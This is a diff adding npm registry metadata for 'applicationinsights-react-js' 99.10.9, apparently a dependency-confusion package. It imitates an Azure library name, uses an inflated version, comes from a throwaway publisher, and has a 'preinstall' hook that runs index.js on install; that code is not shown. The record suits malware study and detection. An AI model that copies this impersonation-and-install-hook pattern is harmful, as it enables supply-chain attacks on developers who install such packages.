@@ -1,0 +1,62 @@
+{
+    "_id": "applicationinsights-react-js",
+    "name": "applicationinsights-react-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "applicationinsights-react-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "applicationinsights-react-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-dOHxOiZbKljXZa5bRexnRqvgqPppTRiw95zaYZiSgGIJ087OAm/2Z1JtA05AjWKNMht7FNZbdILwU1cHjmYw+w==",
+                "shasum": "820047a4699e0a84e6899afdb4acfa9f1cd113da",
+                "tarball": "https://registry.npmjs.org/applicationinsights-react-js/-/applicationinsights-react-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5080,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOmUKACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrU9Q/+NoESvB5nvplvqYdkDl+sPiuXZQ2bmkMXj9XpCTiebTsFFTLk\r\nadNtrE5MzXeIDRnMmCs8zY2hx2cVCoDfXrk5tlSgcdiC7gY/NTsYo22Et3h8\r\nz0HlUi28jyTap7apeDdjGaXdA4LKpl2HmDBm07TkXt0QG7c0FzCxcxAfIwyK\r\nHZaRGWgmLPq2bi07K9CKXx+LmnqNBi/hsXIqcRgaeqNDw7U7tYQMHLC22/oY\r\nxIksNswz2I0kp7PHFvs4AsCl/WdrGtK+yoqqpqQ/cbelCQg3VpiuEZtj89+L\r\nb0VWwsrVjeJbexEDl63fjtWYR6TDL0bNg7bXBlOYiq+Ii2UcMoYmIfsdNm47\r\n7WeokhOSD1BWlZL39l+AWUeKzhwDnM7CEQsDCqsps85TcqD210RwY45jZMLo\r\nhluuGjf5WdIdvlqzjgBfBBIGTK8+Zg8Qyij0kShPI97EdAFtuRi3vW7C7McX\r\ncEuO+E9NY3HWvPEQLSrOr8eJh5eMPAykO7Kh1ZOyR/Qucw9zs5ww11NIlv0k\r\nKk5CkVqyJ7AjWaOJEe48K0oEZvaYTW1LbFg8tkjyVVweswFPn8UakY7Nwqra\r\noNUcXukYq1fbrt3yKZuYPmVIRtbSpJfxkCBwet/1tqsXiADGak9y7NgCsshG\r\nVJYvP1l9p4wZDeBBrOaYwn2IgvIc2RfCIcM=\r\n=iT5f\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "pqffkn4c",
+                "email": "pqffkn4c@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "pqffkn4c",
+                    "email": "pqffkn4c@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/applicationinsights-react-js_99.10.9_1647994121927_0.7417497631641365"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T00:08:41.927Z",
+        "99.10.9": "2022-03-23T00:08:42.049Z",
+        "modified": "2022-03-23T00:08:42.186Z"
+    },
+    "maintainers": [
+        {
+            "name": "pqffkn4c",
+            "email": "pqffkn4c@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
